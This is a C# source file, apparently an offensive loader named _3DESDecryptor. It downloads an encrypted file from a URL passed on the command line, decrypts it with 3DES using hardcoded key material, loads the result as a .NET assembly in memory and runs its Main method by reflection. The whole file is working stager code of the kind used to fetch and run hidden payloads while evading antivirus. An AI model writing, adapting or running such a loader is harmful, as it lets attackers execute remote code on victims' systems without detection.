using System;
using System.Text;
using System.Security.Cryptography;
using System.Reflection;
using System.IO;
using _3DESDecryptor;
using System.Collections.Generic;
using System.Net;

namespace _3DESDecryptor
{
    class Program
    {
        static void Main(string[] args)
        {

            string Password = "oqphnbt0kuedizy4m3avx6r5lf21jc8s";
            string EncryptedBinaryFile = "";
            string EncryptedB64String = "";
            string Salt = "vh9b4tsxrl1560wg8nda2meuc7yjzop3";
            string InitialVector = "SBFTWSDXBYVOEMTD";
            string DecryptedBinaryFilePath = "";
            string DownloadEncryptedBinaryFile = args[0];
            byte[] scriptBytes = new byte[] { };


            /*if (EncryptedBinaryFile != null)
            {
                scriptBytes = System.IO.File.ReadAllBytes(EncryptedBinaryFile);
            }
            else if (EncryptedB64String != null)
            {
                scriptBytes = System.Convert.FromBase64String(EncryptedB64String);
            }
            else if (DownloadEncryptedBinaryFile != null)
            {
                WebClient client = new System.Net.WebClient();
                scriptBytes = client.DownloadData(DownloadEncryptedBinaryFile);
            }
            else 
            {
                Console.WriteLine("[-] Something went wrong!");
            }*/

	    WebClient client = new System.Net.WebClient();
            scriptBytes = client.DownloadData(DownloadEncryptedBinaryFile);
            
            ASCIIEncoding encoding = new ASCIIEncoding();
            PasswordDeriveBytes derivedPass = new PasswordDeriveBytes(Password, encoding.GetBytes(Salt), "SHA1", 2);
            byte[] IV = encoding.GetBytes(InitialVector);
            byte[] Key = derivedPass.GetBytes(16);
            TripleDESCryptoServiceProvider TripleDESobject = new TripleDESCryptoServiceProvider();
            TripleDESobject.Mode = CipherMode.CBC;
            byte[] buffer = new byte[(scriptBytes.Length - 8)];
            ICryptoTransform TripleDESdecryptor = TripleDESobject.CreateDecryptor(Key, IV);
            MemoryStream EncryptedMemoryStream = new MemoryStream(scriptBytes);
            CryptoStream CryptoStreamDecrypt = new CryptoStream(EncryptedMemoryStream, TripleDESdecryptor, CryptoStreamMode.Read);
            int DecryptedData = CryptoStreamDecrypt.Read(buffer, 0, buffer.Length);
            //https://docs.microsoft.com/en-us/dotnet/api/system.reflection.assembly.gettypes?view=net-5.0
            Assembly assembly = Assembly.Load(buffer);
            Type type = assembly.GetTypes()[0];
            //MethodInfo method = assembly.EntryPoint;
	    //object execute = method.Invoke(null, new Object[] { null });
	    type.GetMethod("Main").Invoke(type, new Object[] { });
            CryptoStreamDecrypt.Close();
            TripleDESobject.Clear();
            //return 0;
           

        }
    }
}
